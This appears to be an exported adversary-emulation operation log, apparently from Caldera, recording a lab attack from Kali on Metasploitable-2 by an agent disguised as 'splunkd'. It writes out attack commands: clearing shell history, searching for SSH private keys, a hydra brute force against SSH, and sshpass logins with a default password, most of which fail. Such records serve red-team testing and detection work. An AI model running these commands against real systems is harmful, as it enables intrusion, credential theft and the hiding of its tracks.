@@ -1,0 +1,385 @@
+	
+name	"SSH_LateralMove_Simulation"
+host_group	
+0	
+paw	"dprnmw"
+sleep_min	30
+sleep_max	60
+watchdog	0
+group	"red"
+architecture	"amd64"
+platform	"linux"
+server	"http://192.168.119.129:8888"
+upstream_dest	"http://192.168.119.129:8888"
+username	"osboxes"
+location	"/home/osboxes/splunkd"
+pid	1927
+ppid	1886
+trusted	true
+executors	
+0	"proc"
+1	"sh"
+privilege	"User"
+exe_name	"splunkd"
+host	"0SC"
+contact	"HTTP"
+proxy_receivers	{}
+proxy_chain	[]
+origin_link_id	""
+deadman_enabled	true
+available_contacts	
+0	"HTTP"
+host_ip_addrs	
+0	"192.168.119.128"
+display_name	"0SC$osboxes"
+created	"2026-05-15T15:05:48Z"
+last_seen	"2026-05-15T15:57:14Z"
+links	
+0	
+id	"0e427e27-e3cd-4b7a-b0c9-9d5111413436"
+paw	"dprnmw"
+command	"PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF"
+plaintext_command	"PiAkSE9NRS8uYmFzaF9oaXN0b3J5ICYmIHVuc2V0IEhJU1RGSUxF"
+status	0
+score	0
+jitter	0
+decide	"2026-05-15T15:05:48Z"
+pin	0
+pid	"4006"
+facts	[]
+relationships	[]
+used	[]
+unique	"0e427e27-e3cd-4b7a-b0c9-9d5111413436"
+collect	"2026-05-15T15:05:48Z"
+finish	"2026-05-15T15:05:48Z"
+ability	
+ability_id	"43b3754c-def4-4699-a673-1d85648fda6a"
+tactic	"defense-evasion"
+technique_name	"Indicator Removal on Host: Clear Command History"
+technique_id	"T1070.003"
+name	"Avoid logs"
+description	"Stop terminal from logging history"
+executors	
+0	
+name	"sh"
+platform	"darwin"
+command	"> $HOME/.bash_history && unset HISTFILE"
+code	null
+language	null
+build_target	null
+payloads	[]
+uploads	[]
+timeout	60
+parsers	[]
+cleanup	[]
+variations	[]
+additional_info	{}
+1	
+name	"sh"
+platform	"linux"
+command	"> $HOME/.bash_history && unset HISTFILE"
+code	null
+language	null
+build_target	null
+payloads	[]
+uploads	[]
+timeout	60
+parsers	[]
+cleanup	[]
+variations	[]
+additional_info	{}
+2	
+name	"psh"
+platform	"windows"
+command	"Clear-History;Clear"
+code	null
+language	null
+build_target	null
+payloads	[]
+uploads	[]
+timeout	60
+parsers	[]
+cleanup	[]
+variations	[]
+additional_info	{}
+requirements	[]
+privilege	null
+repeatable	false
+buckets	
+0	"defense-evasion"
+additional_info	{}
+access	{}
+singleton	false
+plugin	"stockpile"
+delete_payload	true
+executor	
+name	"sh"
+platform	"linux"
+command	"> $HOME/.bash_history && unset HISTFILE"
+code	null
+language	null
+build_target	null
+payloads	[]
+uploads	[]
+timeout	60
+parsers	[]
+cleanup	[]
+variations	[]
+additional_info	{}
+cleanup	0
+visibility	
+score	50
+adjustments	[]
+host	"0SC"
+output	"False"
+deadman	false
+agent_reported_time	"2026-05-15T15:05:48Z"
+pending_contact	"HTTP"
+status	"alive"
+start	"2026-05-15T15:48:02Z"
+steps	
+dprnmw	
+steps	
+0	
+link_id	"3c3ea1da-a92d-4a27-8adc-430e3155a328"
+ability_id	"8f76b2ba-8f34-4768-b868-de2fe68d37df"
+command	"getent passwd | awk -F: '$3>=1000 {print $1}'"
+plaintext_command	"getent passwd | awk -F: '$3>=1000 {print $1}'"
+delegated	"2026-05-15T15:48:02Z"
+run	"2026-05-15T15:48:32Z"
+status	0
+platform	"linux"
+executor	"sh"
+pid	4291
+description	"Enumerate human accounts (UID ≥ 1000) on the local host"
+name	"User Discovery"
+attack	
+tactic	"discovery"
+technique_name	"Account Discovery: Local Account"
+technique_id	"T1087.001"
+output	
+stdout	"nobodyosboxessammy"
+stderr	""
+exit_code	"0"
+agent_reported_time	"2026-05-15T15:48:32Z"
+1	
+link_id	"622883bc-992c-4406-b0ac-da6e511f4f59"
+ability_id	"7d485505-a414-4ae2-b99e-b5970d5ff143"
+command	"find /home /root -name 'id_rsa*' 2>/dev/null"
+plaintext_command	"find /home /root -name 'id_rsa*' 2>/dev/null"
+delegated	"2026-05-15T15:48:32Z"
+run	"2026-05-15T15:49:18Z"
+status	1
+platform	"linux"
+executor	"sh"
+pid	4296
+description	"Locate SSH private keys left in home directories"
+name	"Credential Access via SSH Keys"
+attack	
+tactic	"credential-access"
+technique_name	"Unsecured Credentials"
+technique_id	"T1552"
+agent_reported_time	"2026-05-15T15:49:18Z"
+2	
+link_id	"498e4526-bf66-4d5d-9973-b946ea7b4d31"
+ability_id	"dccdc3b5-693b-465a-91ed-dfa197d4b916"
+command	"hydra -L /tmp/users.txt -P /tmp/rockyou-top20.txt -t 4 -f ssh://192.168.119.133"
+plaintext_command	"hydra -L /tmp/users.txt -P /tmp/rockyou-top20.txt -t 4 -f ssh://192.168.119.133"
+delegated	"2026-05-15T15:49:22Z"
+run	"2026-05-15T15:49:56Z"
+status	1
+platform	"linux"
+executor	"sh"
+pid	4298
+description	"Attempt a small dictionary attack against the SSH service on the lateral target"
+name	"SSH Brute Force Simulation"
+attack	
+tactic	"credential-access"
+technique_name	"Brute Force: Credential Stuffing"
+technique_id	"T1110.004"
+output	
+stdout	"Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-15 11:49:56[DATA] max 4 tasks per 1 server, overall 4 tasks, 20 login tries (l:4/p:5), ~5 tries per task[DATA] attacking ssh://192.168.119.133:22/"
+stderr	"[ERROR] could not connect to ssh://192.168.119.133:22 - kex error : no match for method mac algo client->server: server [hmac-md5,hmac-sha1,umac-64@openssh.com,hmac-ripemd160,hmac-ripemd160@openssh.com,hmac-sha1-96,hmac-md5-96], client [hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha2-256,hmac-sha2-512]"
+exit_code	"255"
+agent_reported_time	"2026-05-15T15:49:56Z"
+3	
+link_id	"9e8f9d28-e32e-431d-b5d5-7d8d9f159015"
+ability_id	"410d2026-f29d-4e0c-8b74-90115838726d"
+command	"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null msfadmin@192.168.119.133 'id; hostname'"
+plaintext_command	"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null msfadmin@192.168.119.133 'id; hostname'"
+delegated	"2026-05-15T15:49:57Z"
+run	"2026-05-15T15:50:37Z"
+status	1
+platform	"linux"
+executor	"sh"
+pid	4301
+description	"Confirm the credentials returned by hydra by logging in non-interactively"
+name	"Valid Account Login via SSH"
+attack	
+tactic	"initial-access"
+technique_name	"Valid Accounts: Local Accounts"
+technique_id	"T1078.003"
+output	
+stdout	""
+stderr	"Unable to negotiate with 192.168.119.133 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss"
+exit_code	"255"
+agent_reported_time	"2026-05-15T15:50:37Z"
+4	
+link_id	"f98b5247-e860-4301-929b-c84383d854cf"
+ability_id	"67b6bf59-72ee-4ed2-93c3-a4bc2e75e8c3"
+command	"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null msfadmin@192.168.119.133 'hostname; uname -a; cat /etc/passwd | wc -l'"
+plaintext_command	"sshpass -p msfadmin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null msfadmin@192.168.119.133 'hostname; uname -a; cat /etc/passwd | wc -l'"
+delegated	"2026-05-15T15:50:37Z"
+run	"2026-05-15T15:51:38Z"
+status	1
+platform	"linux"
+executor	"sh"
+pid	4307
+description	"Execute discovery commands on the second host over the established SSH channel"
+name	"SSH Lateral Movement"
+attack	
+tactic	"lateral-movement"
+technique_name	"Remote Services: SSH"
+technique_id	"T1021.004"
+output	
+stdout	""
+stderr	"Unable to negotiate with 192.168.119.133 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss"
+exit_code	"255"
+agent_reported_time	"2026-05-15T15:51:38Z"
+finish	null
+planner	"atomic"
+adversary	
+adversary_id	"0c50c1fe-933b-4ae9-bb12-4171c17f2700"
+name	"SSH Credential Abuse & Lateral Movement"
+description	"Models a post-foothold intruder who abuses weak SSH credentials to pivot from Kali to Metasploitable-2 and install a cron-based persistence mechanism on the second host."
+atomic_ordering	
+0	"8f76b2ba-8f34-4768-b868-de2fe68d37df"
+1	"7d485505-a414-4ae2-b99e-b5970d5ff143"
+2	"dccdc3b5-693b-465a-91ed-dfa197d4b916"
+3	"410d2026-f29d-4e0c-8b74-90115838726d"
+4	"67b6bf59-72ee-4ed2-93c3-a4bc2e75e8c3"
+objective	"495a9828-cab1-44dd-a0ca-66e58177d8cc"
+tags	[]
+has_repeatable_abilities	false
+plugin	""
+jitter	"2/8"
+objectives	
+id	"495a9828-cab1-44dd-a0ca-66e58177d8cc"
+name	"default"
+description	"This is a default objective that runs forever."
+goals	
+0	
+target	"exhaustion"
+value	"complete"
+count	1048576
+operator	"=="
+achieved	false
+percentage	0
+facts	
+0	
+unique	"file.sensitive.extensionwav"
+trait	"file.sensitive.extension"
+name	"file.sensitive.extension"
+value	"wav"
+created	"2026-05-15T15:05:32Z"
+score	1
+source	"ed32b9c3-9593-4c33-b0db-e2007315096b"
+origin_type	"IMPORTED"
+links	[]
+relationships	[]
+limit_count	-1
+collected_by	[]
+technique_id	""
+1	
+unique	"file.sensitive.extensionyml"
+trait	"file.sensitive.extension"
+name	"file.sensitive.extension"
+value	"yml"
+created	"2026-05-15T15:05:32Z"
+score	1
+source	"ed32b9c3-9593-4c33-b0db-e2007315096b"
+origin_type	"IMPORTED"
+links	[]
+relationships	[]
+limit_count	-1
+collected_by	[]
+technique_id	""
+2	
+unique	"file.sensitive.extensionpng"
+trait	"file.sensitive.extension"
+name	"file.sensitive.extension"
+value	"png"
+created	"2026-05-15T15:05:32Z"
+score	1
+source	"ed32b9c3-9593-4c33-b0db-e2007315096b"
+origin_type	"IMPORTED"
+links	[]
+relationships	[]
+limit_count	-1
+collected_by	[]
+technique_id	""
+3	
+unique	"server.malicious.urlkeyloggedsite.com"
+trait	"server.malicious.url"
+name	"server.malicious.url"
+value	"keyloggedsite.com"
+created	"2026-05-15T15:05:32Z"
+score	1
+source	"ed32b9c3-9593-4c33-b0db-e2007315096b"
+origin_type	"IMPORTED"
+links	[]
+relationships	[]
+limit_count	-1
+collected_by	[]
+technique_id	""
+4	
+unique	"host.file.path//github.com/vanhauser-thc/thc-hydra)"
+trait	"host.file.path"
+name	"host.file.path"
+value	"//github.com/vanhauser-thc/thc-hydra)"
+created	"2026-05-15T15:49:56Z"
+score	1
+source	"ce83b32e-4c06-4c76-9dd5-7dad07b40832"
+origin_type	"LEARNED"
+links	
+0	"498e4526-bf66-4d5d-9973-b946ea7b4d31"
+relationships	[]
+limit_count	-1
+collected_by	
+0	"dprnmw"
+technique_id	"T1110.004"
+5	
+unique	"host.file.path//192.168.119.133:22/"
+trait	"host.file.path"
+name	"host.file.path"
+value	"//192.168.119.133:22/"
+created	"2026-05-15T15:49:56Z"
+score	1
+source	"ce83b32e-4c06-4c76-9dd5-7dad07b40832"
+origin_type	"LEARNED"
+links	
+0	"498e4526-bf66-4d5d-9973-b946ea7b4d31"
+relationships	[]
+limit_count	-1
+collected_by	
+0	"dprnmw"
+technique_id	"T1110.004"
+6	
+unique	"host.ip.address192.168.119.133"
+trait	"host.ip.address"
+name	"host.ip.address"
+value	"192.168.119.133"
+created	"2026-05-15T15:49:56Z"
+score	1
+source	"ce83b32e-4c06-4c76-9dd5-7dad07b40832"
+origin_type	"LEARNED"
+links	
+0	"498e4526-bf66-4d5d-9973-b946ea7b4d31"
+relationships	[]
+limit_count	-1
+collected_by	
+0	"dprnmw"
+technique_id	"T1110.004"
+skipped_abilities	
+0	
+dprnmw	[]
